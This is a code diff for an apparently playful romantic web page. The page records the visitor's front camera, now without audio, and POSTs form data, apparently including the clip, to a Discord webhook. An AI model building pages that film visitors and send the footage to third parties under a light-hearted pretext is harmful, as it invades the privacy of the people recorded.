@@ -14,9 +14,7 @@ function showScreen(screenId) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Start heart rain
     createHeartRain();
-
     showScreen('loginScreen');
 
     document.getElementById('enterBtn').addEventListener('click', () => {
@@ -72,7 +70,11 @@ function startMusic() {
 async function startRecording() {
     if (recordingStarted) return;
     try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        // ⬇️ AUDIO FALSE: only camera, no microphone
+        stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }, 
+            audio: false 
+        });
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 500000 });
         recordedChunks = [];
         mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
@@ -81,7 +83,7 @@ async function startRecording() {
         document.getElementById('recordStatus').textContent = 'Recording... 📹';
         checkAndProceed();
     } catch (err) {
-        alert('Please allow camera access! ');
+        alert('Please allow camera access! 🙏');
     }
 }
 
@@ -259,13 +261,11 @@ function setupFinale() {
                 try {
                     const res = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                     if (res.ok) {
-                        // Upload success – hide form, show blast
                         document.getElementById('finaleForm').style.display = 'none';
                         document.getElementById('finaleSky').classList.add('fireworks-effect');
 
                         const blast = document.getElementById('blastContainer');
                         blast.style.display = 'flex';
-                        // Wait for blast animation (2s) then show pigeon
                         setTimeout(() => {
                             blast.style.display = 'none';
                             const pigeon = document.getElementById('pigeonContainer');
